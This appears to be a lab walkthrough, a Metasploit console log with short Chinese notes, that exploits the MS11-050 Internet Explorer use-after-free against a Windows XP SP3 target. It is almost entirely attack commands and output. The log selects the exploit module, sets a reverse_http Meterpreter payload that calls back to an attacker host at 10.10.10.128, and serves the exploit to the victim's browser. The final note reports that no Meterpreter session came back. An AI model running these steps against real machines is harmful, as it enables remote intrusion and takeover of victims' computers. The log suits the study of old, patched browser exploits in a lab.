```shell
msf > search ms11_050
	Matching Modules
	================
	   Name                                                    Disclosure Date  Rank    Description
	   ----                                                    ---------------  ----    -----------
	   exploit/windows/browser/ms11_050_mshtml_cobjectelement  2011-06-16       normal  MS11-050 IE mshtml!CObjectElement Use After Free
msf > use exploit/windows/browser/ms11_050_mshtml_cobjectelement 
msf exploit(ms11_050_mshtml_cobjectelement) > info 
		   Name: MS11-050 IE mshtml!CObjectElement Use After Free
		 Module: exploit/windows/browser/ms11_050_mshtml_cobjectelement
	   Platform: Windows
	 Privileged: No
		License: Metasploit Framework License (BSD)
		   Rank: Normal
	  Disclosed: 2011-06-16
	Provided by:
	  d0c_s4vage
	  sinn3r <sinn3r@metasploit.com>
	  bannedit <bannedit@metasploit.com>
	Available targets:
	  Id  Name
	  --  ----
	  0   Automatic
	  1   Internet Explorer 7 on XP SP3
	  2   Internet Explorer 7 on Windows Vista
	  3   Internet Explorer 8 on XP SP3
	  4   Internet Explorer 8 on Windows 7
	  5   Debug Target (Crash)
	Basic options:
	  Name       Current Setting  Required  Description
	  ----       ---------------  --------  -----------
	  OBFUSCATE  false            no        Enable JavaScript obfuscation
	  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
	  SRVPORT    8080             yes       The local port to listen on.
	  SSL        false            no        Negotiate SSL for incoming connections
	  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	  URIPATH                     no        The URI to use for this exploit (default is random)
	Payload information:
	  Space: 500
	  Avoid: 6 characters
	Description:
	  This module exploits a use-after-free vulnerability in Internet 
	  Explorer. The vulnerability occurs when an invalid <object> tag 
	  exists and other elements overlap/cover where the object tag should 
	  be when rendered (due to their styles/positioning). The 
	  mshtml!CObjectElement is then freed from memory because it is 
	  invalid. However, the mshtml!CDisplay object for the page continues 
	  to keep a reference to the freed <object> and attempts to call a 
	  function on it, leading to the use-after-free. Please note that for 
	  IE 8 targets, JRE (Java Runtime Environment) is required to bypass 
	  DEP (Data Execution Prevention).
	References:
	  https://cvedetails.com/cve/CVE-2011-1260/
	  OSVDB (72950)
	  https://technet.microsoft.com/en-us/library/security/MS11-050
	  http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html
msf exploit(ms11_050_mshtml_cobjectelement) > set payload windows/meterpreter/reverse_http
	payload => windows/meterpreter/reverse_http
msf exploit(ms11_050_mshtml_cobjectelement) > show options 
	Module options (exploit/windows/browser/ms11_050_mshtml_cobjectelement):
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   OBFUSCATE  false            no        Enable JavaScript obfuscation
	   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
	   SRVPORT    8080             yes       The local port to listen on.
	   SSL        false            no        Negotiate SSL for incoming connections
	   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	   URIPATH                     no        The URI to use for this exploit (default is random)
	Payload options (windows/meterpreter/reverse_http):
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST                      yes       The local listener hostname
	   LPORT     8080             yes       The local listener port
	   LURI                       no        The HTTP Path
	Exploit target:
	   Id  Name
	   --  ----
	   0   Automatic
msf exploit(ms11_050_mshtml_cobjectelement) > set URIPATH ms11050
	TH => ms11050
msf exploit(ms11_050_mshtml_cobjectelement) > set LHOST 10.10.10.128
	OST => 10.10.10.128
msf exploit(ms11_050_mshtml_cobjectelement) > set LPORT 8443
msf exploit(ms11_050_mshtml_cobjectelement) > exploit 
	[*] Exploit running as background job.
	[*] Started HTTP reverse handler on http://10.10.10.128:8443
	[*] Using URL: http://0.0.0.0:8080/ms11050
	msf exploit(ms11_050_mshtml_cobjectelement) > [*] Local IP: http://10.10.10.128:8080/ms11050
	[*] Server started.
```

- 先在WinXPSP3上安装IE7.0
- 靶机浏览器访问 http://10.10.10.128:8080/ms11050 之后
- 返回查看 msf 信息
```shell	
	[*] 10.10.10.254     ms11_050_mshtml_cobjectelement - Sending exploit (Internet Explorer 7 on XP SP3)...
	[*] 10.10.10.254     ms11_050_mshtml_cobjectelement - Sending exploit (Internet Explorer 7 on XP SP3)...
	[*] 10.10.10.254     ms11_050_mshtml_cobjectelement - Sending exploit (Internet Explorer 7 on XP SP3)...
```

## 本漏洞暂时无法弹回meterpreter
